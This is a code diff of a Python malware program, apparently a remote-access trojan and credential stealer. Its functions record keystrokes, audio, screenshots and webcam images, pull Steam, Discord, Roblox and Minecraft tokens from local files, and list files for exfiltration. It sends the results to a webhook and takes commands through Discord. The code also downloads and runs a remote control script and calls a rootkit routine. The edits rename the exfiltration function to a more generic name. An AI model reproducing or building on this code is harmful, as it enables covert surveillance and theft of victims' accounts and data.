@@ -27,6 +27,9 @@ import platform
 import random
 import string
 import PyInstaller.__main__
+from pathlib import Path
+import atexit
+import aiohttp
 
 # Setup Logging
 BASE_DIR = Path(__file__).resolve().parent
@@ -186,7 +189,7 @@ def download_and_execute_bot_control_script():
     except Exception as e:
         logger.error(f"Failed to download or execute bot control script: {e}")
 
-def send_to_discord(message):
+def send_webhook(message):
     try:
         payload = {"content": message}
         response = requests.post(WEBHOOK_URL, json=payload)
@@ -206,7 +209,7 @@ def log_keystroke(key):
         else:
             key_str = key.char if hasattr(key, 'char') and key.char else str(key)
         logger.info(key_str)
-        send_to_discord(key_str)
+        send_webhook(key_str)
     except Exception as e:
         logger.error(f"Keylogging failed: {e}")
 
@@ -240,7 +243,7 @@ def record_audio(duration=30):
             wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
             wf.setframerate(44100)
             wf.writeframes(b''.join(frames))
-        send_to_discord(f"Audio recorded and saved as {filename}")
+        send_webhook(f"Audio recorded and saved as {filename}")
     except Exception as e:
         logger.error(f"Audio recording failed: {e}")
 
@@ -249,7 +252,7 @@ def capture_screenshot():
         screenshot = ImageGrab.grab()
         filename = f"screenshot_{int(time.time())}.png"
         screenshot.save(filename)
-        send_to_discord(f"Screenshot captured successfully: {filename}")
+        send_webhook(f"Screenshot captured successfully: {filename}")
     except Exception as e:
         logger.error(f"Screenshot capture failed: {e}")
 
@@ -260,7 +263,7 @@ def capture_webcam():
         if ret:
             filename = f"webcam_{int(time.time())}.png"
             cv2.imwrite(filename, frame)
-            send_to_discord(f"Webcam photo saved as {filename}")
+            send_webhook(f"Webcam photo saved as {filename}")
             cap.release()
     except Exception as e:
         logger.error(f"Webcam capture failed: {e}")
@@ -276,9 +279,9 @@ def steam_dump():
                         data = f.read()
                         if 'steamid' in data:
                             steam_token = data.split('steamid')[1].split('"')[1]
-                            send_to_discord(f"Steam token found: {steam_token}")
+                            send_webhook(f"Steam token found: {steam_token}")
         if not steam_token:
-            send_to_discord("No Steam token found.")
+            send_webhook("No Steam token found.")
     except Exception as e:
         logger.error(f"Steam dump failed: {e}")
 
@@ -293,9 +296,9 @@ def discord_dump():
                         data = f.read()
                         if 'token' in data:
                             discord_token = data.split('token')[1].split('"')[1]
-                            send_to_discord(f"Discord token found: {discord_token}")
+                            send_webhook(f"Discord token found: {discord_token}")
         if not discord_token:
-            send_to_discord("No Discord token found.")
+            send_webhook("No Discord token found.")
     except Exception as e:
         logger.error(f"Discord dump failed: {e}")
 
@@ -310,9 +313,9 @@ def roblox_dump():
                         data = f.read()
                         if 'cookie' in data:
                             roblox_token = data.split('cookie')[1].split('"')[1]
-                            send_to_discord(f"Roblox token found: {roblox_token}")
+                            send_webhook(f"Roblox token found: {roblox_token}")
         if not roblox_token:
-            send_to_discord("No Roblox token found.")
+            send_webhook("No Roblox token found.")
     except Exception as e:
         logger.error(f"Roblox dump failed: {e}")
 
@@ -325,9 +328,9 @@ def minecraft_dump():
                 data = json.load(f)
                 if 'auth_player_name' in data:
                     minecraft_token = data['auth_player_name']
-                    send_to_discord(f"Minecraft session found: {minecraft_token}")
+                    send_webhook(f"Minecraft session found: {minecraft_token}")
         if not minecraft_token:
-            send_to_discord("No Minecraft token found.")
+            send_webhook("No Minecraft token found.")
     except Exception as e:
         logger.error(f"Minecraft dump failed: {e}")
 
@@ -335,7 +338,7 @@ def exfiltrate_files():
     try:
         files = [f for f in os.listdir() if f.endswith('.txt')]
         for file in files:
-            send_to_discord(f"Exfiltrated file: {file}")
+            send_webhook(f"Exfiltrated file: {file}")
     except Exception as e:
         logger.error(f"File exfiltration failed: {e}")
 
@@ -365,7 +368,7 @@ async def on_message(message):
             record_audio(duration)
         except Exception as e:
             logging.error(f"Audio command error: {e}")
-            send_to_discord("Usage: !record_audio <duration>")
+            send_webhook("Usage: !record_audio <duration>")
 
     elif message.content.startswith("!screenshot"):
         capture_screenshot()
@@ -389,10 +392,10 @@ async def on_message(message):
         exfiltrate_files()
 
     elif message.content == "!help":
-        send_to_discord("Help command list not implemented.")
+        send_webhook("Help command list not implemented.")
 
     else:
-        send_to_discord(f"Unknown command: {message.content}")
+        send_webhook(f"Unknown command: {message.content}")
 
 async def setup():
     apply_rootkit_technique()
